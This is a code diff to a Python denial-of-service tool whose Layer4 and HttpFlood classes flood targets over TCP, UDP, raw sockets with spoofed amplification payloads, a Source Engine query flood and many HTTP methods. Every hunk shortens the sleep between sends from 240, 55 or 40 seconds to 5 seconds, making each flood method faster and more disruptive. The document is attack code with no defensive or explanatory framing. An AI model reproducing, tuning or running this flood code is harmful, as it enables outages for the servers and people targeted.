@@ -203,7 +203,7 @@ class Layer4:
                 s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                 s.connect(self._target)
                 while s.send(randbytes(1024)):
-                    sleep(240.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             requests_sent = requests_sent - 1
@@ -245,7 +245,7 @@ class Layer4:
         try:
             with socket(AF_INET, SOCK_DGRAM) as s:
                 while s.sendto(randbytes(1024), self._target):
-                    sleep(240.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             requests_sent = requests_sent - 1
@@ -301,7 +301,7 @@ class Layer4:
             with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                 while s.sendto(*next(self._amp_payloads)):
-                    sleep(240.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             requests_sent = requests_sent - 1
@@ -329,7 +329,7 @@ class Layer4:
             with socket(AF_INET, SOCK_DGRAM) as s:
                 while s.sendto((b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                                 b'\x20\x51\x75\x65\x72\x79\x00'), self._target):
-                    sleep(40.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             requests_sent = requests_sent - 1
@@ -517,7 +517,7 @@ class HttpFlood:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     s.send(payload)
-                    sleep(55.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             global requests_sent
@@ -552,7 +552,7 @@ class HttpFlood:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     s.send(payload)
-                    sleep(55.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             global requests_sent
@@ -589,7 +589,7 @@ class HttpFlood:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     s.send(payload)
-                    sleep(55.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             global requests_sent
@@ -616,7 +616,7 @@ class HttpFlood:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     s.send(payload)
-                    sleep(55.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             global requests_sent
@@ -661,7 +661,7 @@ class HttpFlood:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     s.send(payload)
-                    sleep(55.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             global requests_sent
@@ -686,7 +686,7 @@ class HttpFlood:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     s.send(self._defaultpayload)
-                    sleep(55.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             global requests_sent
@@ -713,7 +713,7 @@ class HttpFlood:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     s.send(payload)
-                    sleep(55.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             global requests_sent
@@ -778,7 +778,7 @@ class HttpFlood:
                 ))
                 for _ in range(self._rpc):
                     s.send(payload)
-                    sleep(55.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             global requests_sent
@@ -804,7 +804,7 @@ class HttpFlood:
         try:
             with self.open_connection() as s:
                 while s.send(payload) and s.recv(1):
-                    sleep(55.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             global requests_sent
@@ -831,7 +831,7 @@ class HttpFlood:
             with self.open_connection() as s:
                 for _ in range(min(self._rpc, 5)):
                     s.send(payload)
-                    sleep(55.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             global requests_sent
@@ -868,7 +868,7 @@ class HttpFlood:
                         s.get(self._target.human_repr(), proxies=pro.asRequest())
                         continue
                     s.get(self._target.human_repr())
-                    sleep(55.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             global requests_sent
@@ -948,7 +948,7 @@ class HttpFlood:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     s.send(payload)
-                    sleep(55.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             global requests_sent
@@ -1007,7 +1007,7 @@ class HttpFlood:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     s.send(payload)
-                    sleep(55.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             global requests_sent
@@ -1044,7 +1044,7 @@ class HttpFlood:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     s.send(payload)
-                    sleep(55.0)
+                    sleep(5.0)
         except Exception:
             s.close()
             global requests_sent
